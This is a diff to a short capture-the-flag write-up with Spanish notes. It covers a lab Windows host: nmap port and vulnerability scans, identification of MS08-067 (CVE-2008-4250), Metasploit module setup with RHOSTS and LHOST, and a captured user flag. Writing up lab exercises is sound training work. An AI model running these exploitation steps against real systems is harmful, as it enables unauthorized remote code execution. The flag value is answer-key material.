@@ -16,22 +16,29 @@
 ---
 
 `nmap -p- --open -sC -sV --min-rate 5000 -n -vvv -oN Portscan 10.10.10.4`
+
 ![Pasted image 20241124001327](../../Fotos/Pasted%20image%2020241124001327.png)
+
 ![Pasted image 20241124001343](../../Fotos/Pasted%20image%2020241124001343.png)
 
 `nmap --script vuln -p445 10.10.10.4`
+
 ![Pasted image 20241124001655](../../Fotos/Pasted%20image%2020241124001655.png)
+
 ![Pasted image 20241124001704](../../Fotos/Pasted%20image%2020241124001704.png)
+
 - Microsoft Windows system vulnerable to remote code execution (MS08-067)
 - CVE:CVE-2008-4250
 
 `msfconsole`
 search CVE:CVE-2008-4250
 use 0
+
 ![Pasted image 20241124001958](../../Fotos/Pasted%20image%2020241124001958.png)
 
 `set RHOSTS 10.10.10.4`
 - LHOST : ip interfaz con la que tenemos conectividad
+
 ![Pasted image 20241124002224](../../Fotos/Pasted%20image%2020241124002224.png)
 
 User Flag: e69af0e4f443de7e36876fda4ec7644f
